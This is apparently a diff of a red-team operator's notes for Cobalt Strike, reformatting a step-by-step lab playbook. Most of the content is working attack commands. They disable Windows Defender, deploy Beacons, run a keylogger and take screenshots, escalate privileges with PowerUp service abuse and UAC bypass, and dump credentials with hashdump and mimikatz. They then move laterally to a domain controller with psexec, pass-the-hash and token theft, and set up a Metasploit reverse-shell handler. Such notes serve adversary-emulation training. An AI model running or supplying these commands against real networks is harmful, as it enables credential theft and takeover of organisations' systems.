@@ -24,16 +24,17 @@ Login to the team server
     VerifyFingerprint (compare with the SHA256 hash) > Yes
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Create an HTTP Listener
-    Cobalt Strike > Listeners > Add
-    Name: Initial access
-    Payload: Beacon HTTP
-    HTTP Hosts: click the plus sign > you should see your IP address > OK
-    HTTP Port: 80
-    Save > OK
+# Create an HTTP Listener
+
+Cobalt Strike > Listeners > Add
+Name: Initial access
+Payload: Beacon HTTP
+HTTP Hosts: click the plus sign > you should see your IP address > OK
+HTTP Port: 80
+Save > OK
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Launch an attack to gain a foothold.
+# Launch an attack to gain a foothold.
 
 Disable Windows Defender on your Windows VM.
     Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
@@ -58,7 +59,7 @@ Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
 
 Interact with the Beacon
     Right-click on the Beacon > Interact
-    sleep 2                                 Have the Beacon check in once every 2 seconds
+    sleep 2                                       Have the Beacon check in once every 2 seconds
     help
     help <command>
 
@@ -99,62 +100,67 @@ All commands and their output are written to the logs directory.
 ctrl+k will clear the current window.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Enumerate host
-    getuid                                  Get User ID
-    keylogger                               Inject a keystroke logger into a process
-                                              View > Keylogger > select item in lower left pane
-    screenshot                              Take a screenshot
-                                              View > Screenshots > select item in lower left pane
-    ps                                      Show process list
-    pwd                                     Print current directory
-    ls                                      List files
-    drives                                  List drives on target
+# Enumerate host
 
-    shell ipconfig /all
-    shell arp -a
-    shell systeminfo                        System info
+getuid                                            Get User ID
+keylogger                                         Inject a keystroke logger into a process
+                                                    View > Keylogger > select item in lower left pane
+screenshot                                        Take a screenshot
+                                                    View > Screenshots > select item in lower left pane
+ps                                                Show process list
+pwd                                               Print current directory
+ls                                                List files
+drives                                            List drives on target
 
-    net computers                           List hosts in a domain (groups)
-    net domain                              Display domain for this host
-    net dclist                              List domain controllers
-    net domain_controllers                  List DCs in a domain (groups)
-    net domain_trusts                       List domain trusts
-    shell net accounts                      Policy settings for user accounts
-    net user                                List users and user information
-    net group                               List groups and users in groups
-    net localgroup                          List local groups and users in local groups
-    net localgroup Users                    Show users in the Users security group
-    net localgroup Administrators           Show users in the Administrators security group
-    net logons                              List users logged onto a host
-    net sessions                            List sessions on a host
-    net share                               List shares on a host
-    net time                                Show time for a host
-    net view                                List hosts in a domain (browser service)
+shell tasklist
+shell ver
+shell ipconfig /all
+shell arp -a
+shell systeminfo                                 System info
+shell netstat -ano
 
-    jobs                                    List long-running post-exploitation tasks. Look for keylogger JID
-    jobkill <JID>                           Kill a long-running post-exploitation task. Kill the keylogger using its JID
-    jobs                                    Verify the keylogger is no longer running
+net computers                                     List hosts in a domain (groups)
+net domain                                        Display domain for this host
+net dclist                                        List domain controllers
+net domain_controllers                            List DCs in a domain (groups)
+net domain_trusts                                 List domain trusts
+shell net accounts                                Policy settings for user accounts
+net user                                          List users and user information
+net group                                         List groups and users in groups
+net localgroup                                    List local groups and users in local groups
+net localgroup Users                              Show users in the Users security group
+net localgroup Administrators                     Show users in the Administrators security group
+net logons                                        List users logged onto a host
+net sessions                                      List sessions on a host
+net share                                         List shares on a host
+net time                                          Show time for a host
+net view                                          List hosts in a domain (browser service)
+
+jobs                                              List long-running post-exploitation tasks. Look for keylogger JID
+jobkill <JID>                                     Kill a long-running post-exploitation task. Kill the keylogger using its JID
+jobs                                              Verify the keylogger is no longer running
 
 Seatbelt
-    Download https://github.com/GhostPack/Seatbelt to a Windows VM.
+    Download https://github.com/GhostPack/Seatbelt to a Windows attack VM.
     Open C:\Downloads\Seatbelt\Seatbelt.sln with Visual Studio.
     Build > Build Solution.
     There will be no output on the screen.
-    This should compile to C:\Downloads\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe.
+    This wil compile to C:\Downloads\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe.
     Transfer this file to your Kali VM or run Cobalt Strike from the same Windows VM.
     beacon> execute-assembly /root/Desktop/Seatbelt.exe -group=system
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Escalate privileges
-    powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
-    powerpick Invoke-AllChecks
+# Escalate privileges
 
-    powerpick Invoke-ServiceAbuse -Name 'crappy-serverice'
-    spawnas john Password123! smb
-    Select john in the top pane > right-click > Interact
-    bypassuac http
+powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
+powerpick Invoke-AllChecks
 
-    john should now be running in a high integrity Beacon (see asterisk)
+powerpick Invoke-ServiceAbuse -Name 'crappy-serverice'
+spawnas john Password123! smb
+Select john in the top pane > right-click > Interact
+bypassuac http
+
+john should now be running in a high integrity Beacon (see asterisk)
 
 Dump passwords
     logonpasswords
@@ -167,39 +173,13 @@ Dump passwords
     Select the new user in the top pane > right-click > Interact
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Needs admin privs
-    shell net view /domain                                         Find what domain you are on
-    shell net localgroup Administrators /domain
-    shell net group "Domain Computers" /domain                     List all computers joined to the domain
-    wdigest                                                        See if there are any interesting credentials
-    hashdump                                                       Dump the hashes
-
-Misc
-    shell nltest /dclist:<domain>                                  Locate the domain controller
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 Lateral Movement
 
 Always use a FQDN instead of an IP.
-If you have remote access to a VM, but can’t use psexec, reboot it and login as a domain user.
-
-Domain users:
-Get-DomainUser -Domain acme.com -DomainController 10.0.0.2 | findstr samaccountname
-Domain admins:
-Get-DomainGroupMember -identity "Domain Admins" -Domain acme.com -DomainController 10.0.0.2 | findstr MemberName
-Shares that our current user is able to access:
-Find-DomainShare -CheckShareAccess -Domain acme.com -DomainController 10.0.0.2
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Scenario 33
-
-172.31.2.4	wkstn-02
-172.31.2.70	wkuser-70
-172.31.4.5	site-file
-172.31.4.4	site-dc
-
-Summary: Emulate lateral movement between one victim egress host and four other hosts, that uses SMB for lateral
-movement, as well as follow-on victim to victim communications.
+# Emulate lateral movement between one victim egress host and four other hosts, that uses SMB for lateral
+  movement, as well as follow-on victim to victim communications.
 
 Controller domain: acme.org
 Controller IP: x.x.x.x
@@ -212,31 +192,32 @@ rm data/*.bin
 Start Cobalt Strike and point to localhost.
 
 Create http and smb listeners.
+
 Launch an attack to gain a foothold.
 
 Login to wkstn-02 as Administrator, open a command prompt, and paste in the PowerShell.
 You should have an http Beacon on Cobalt Strike in about 10 sec.
 
 Right-click on the new http Beacon > Interact
-sleep 2                                                            Make the Beacon interactive
+sleep 2                                           Make the Beacon interactive
 note foothold
-ps                                                                 Look for another user logged in
+ps                                                Look for another user logged in
 inject <PID> <Arch> <listener>
 inject 5678 x64 smb
 Right-click on the new smb Beacon > Interact
-hashdump                                                           Recover local account password hashes
-logonpasswords                                                     Harvest credentials with mimikatz
+hashdump                                          Recover local account password hashes
+logonpasswords                                    Harvest credentials with mimikatz
 View > Credentials
 
-shell net view /domain                                             Show the domain
+net view /domain                                  Show the domain
 make_token site\administrator password
-shell net group "Domain Computers" /DOMAIN                         Show computers joined to the domain
-shell nltest /dclist:SITE                                          Locate the domain controller
-ls \\wkuser-70\C$                                                  Test remote access
-psexec_psh wkuser-70 smb                                           You should have a new smb Beacon in about 10 sec
+net group "Domain Computers" /DOMAIN              Show computers joined to the domain
+shell nltest /dclist:SITE                         Locate the domain controller
+ls \\wkuser-70\C$                                 Test remote access
+psexec_psh wkuser-70 smb                          You should have a new smb Beacon in about 10 sec
 
 Right-click on the new smb Beacon > Interact
-sleep 2                                                            Have the Beacon check in once every 2 seconds
+sleep 2                                           Have the Beacon check in once every 2 seconds
 note 1st hop
 ps
 hashdump
@@ -246,7 +227,7 @@ ls \\site-file\C$
 psexec_psh site-file smb
 
 Right-click on the new http Beacon > Interact
-sleep 2                                                            Have the Beacon check in once every 2 seconds
+sleep 2                                           Have the Beacon check in once every 2 seconds
 note 2nd hop
 ps
 hashdump
@@ -256,11 +237,11 @@ ls \\site-dc\C$
 psexec_psh site-dc smb	
 	
 Right-click on the new http Beacon > Interact
-sleep 2                                                            Have the Beacon check in once every 2 seconds
+sleep 2                                           Have the Beacon check in once every 2 seconds
 note 3rd hop
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Other notes
+# Misc notes
 
 # Catch the callback from wkstn-04
 use exploit/multi/handler
@@ -333,54 +314,4 @@ set ReverseListenerBindAddress 0.0.0.0
 set ReverseListenerBindPort 443
 run
 migrate -N svchost.exe
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Create HTTP and smb listeners.
-Launch an attack to gain a foothold.
-
-Right-click on the new HTTP Beacon > Interact
-sleep 2                                                            Have the Beacon check in once every 2 seconds
-shell whoami /groups                                               Part of the Administrators group
-    Running in a medium integrity context
-    Need to elevate our privileges
-bypassuac smb                                                      Now running in a high integrity context (see the asterisks)
-
-Right-click on the new SMB Beacon > Interact
-sleep 2                                                            Have the Beacon check in once every 2 seconds
-ps                                                                 Look for another user logged in
-inject <PID> <Arch> <listener>
-inject 4820 x64 smb
-
-Right-click on the new SMB Beacon > Interact
-sleep 2                                                            Have the Beacon check in once every 2 seconds
-hashdump
-logonpasswords
-View > Credentials
-
-shell net view /domain                                             Show the domain
-shell nltest /dclist:CORP                                          Locate the domain controller
-shell net group "Domain Computers" /DOMAIN                         Show computers joined to the domain
-
-ls \\target2\C$                                                    Test remote access. Access is denied
-    Scroll up and copy the admin hash
-pth Administrator <LM hash>:<NTLM hash> powershell -w hidden
-
-steal_token <NTLM PID>
-ls \\target2\C$
-    See if you have trust to the next target
-    If so, lateral move using WMI
-wmi target2 smb
-rev2self                                                           Drop the current token
-
-powershell-import /opt/PowerSploit/Recon/PowerView.ps1
-powerpick Find-LocalAdminAccess
-
-psexec fileserver ADMIN$ smb
-
-Right-click on the new SMB Beacon > Interact
-sleep 2                                                            Have the Beacon check in once every 2 seconds
-note fileserver
-ps                                                                 A domain admin is logged on
-steal_token <PID>
-psexec dc SYSVOL smb
 
